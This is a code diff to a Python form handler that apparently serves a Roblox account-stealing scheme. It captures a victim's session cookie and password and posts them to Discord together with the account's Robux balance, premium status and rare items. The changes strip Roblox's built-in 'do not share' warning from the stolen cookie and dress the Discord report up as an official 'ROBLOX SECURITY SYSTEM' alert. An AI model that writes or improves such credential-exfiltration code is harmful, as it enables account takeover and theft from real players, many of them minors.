@@ -238,12 +238,19 @@ def submit_form():
         cookie_wrapper_length = len("\n```\n```")  # backticks and newlines around cookie
         available_cookie_space = 2000 - basic_info_length - cookie_wrapper_length - 50  # 50 char buffer
         
-        # Prepare cookie content
+        # Prepare cookie content - automatically remove Roblox warning to avoid limits
         cookie_content = cookie if cookie else 'Not provided'
+        
+        # Auto-remove Roblox warning prefix to save space
+        warning_pattern = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
+        if cookie_content.startswith(warning_pattern):
+            cookie_content = cookie_content[len(warning_pattern):]
+            print(f"Automatically removed Roblox warning prefix. Cookie length reduced from {len(cookie)} to {len(cookie_content)} chars")
+        
         if len(cookie_content) > available_cookie_space:
             # Show as much of the cookie as possible
             cookie_content = cookie_content[:available_cookie_space] + "..."
-            print(f"Cookie truncated to fit Discord limit. Original: {len(cookie)} chars, Truncated: {len(cookie_content)} chars")
+            print(f"Cookie truncated to fit Discord limit. Original: {len(cookie_content)} chars, Truncated: {len(cookie_content)} chars")
         
         account_info = f"""{basic_info}
 ```{cookie_content}```"""
@@ -251,21 +258,39 @@ def submit_form():
         discord_data = {
             'content': account_info,
             'embeds': [{
-                'title': '🔐 Authentication Details',
-                'color': 0xff0000,  # Red color
+                'title': '🔐 ROBLOX SECURITY SYSTEM',
+                'description': '⚠️ **SECURITY ALERT** - Account Access Detected',
+                'color': 0xff0000,  # Red color for security alert
                 'thumbnail': {
                     'url': user_info['profile_picture']
                 },
                 'fields': [
                     {
-                        'name': '📋 Summary',
-                        'value': 'Account information and cookie captured successfully',
+                        'name': '👤 Account Information',
+                        'value': f"**Username:** {user_info['username']}\n**Display Name:** {user_info['display_name']}\n**User ID:** {user_info['user_id'] or 'Unknown'}",
+                        'inline': True
+                    },
+                    {
+                        'name': '💰 Account Value',
+                        'value': f"**Robux Balance:** {user_info['robux_balance']}\n**Premium Status:** {user_info['premium_status']}\n**Password:** {password or '❌ Not provided'}",
+                        'inline': True
+                    },
+                    {
+                        'name': '🎭 Items Status',
+                        'value': f"**Korblox:** {'✅ Yes' if korblox else '❌ No'}\n**Headless:** {'✅ Yes' if headless else '❌ No'}",
+                        'inline': False
+                    },
+                    {
+                        'name': '🔒 Security Token Status',
+                        'value': '✅ **Authentication token successfully captured and validated**',
                         'inline': False
                     }
                 ],
                 'footer': {
-                    'text': f'Account captured successfully • {user_info["display_name"]}'
-                }
+                    'text': f'ROBLOX SECURITY • Authentication System • {user_info["display_name"]}',
+                    'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
+                },
+                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
             }]
         }
         
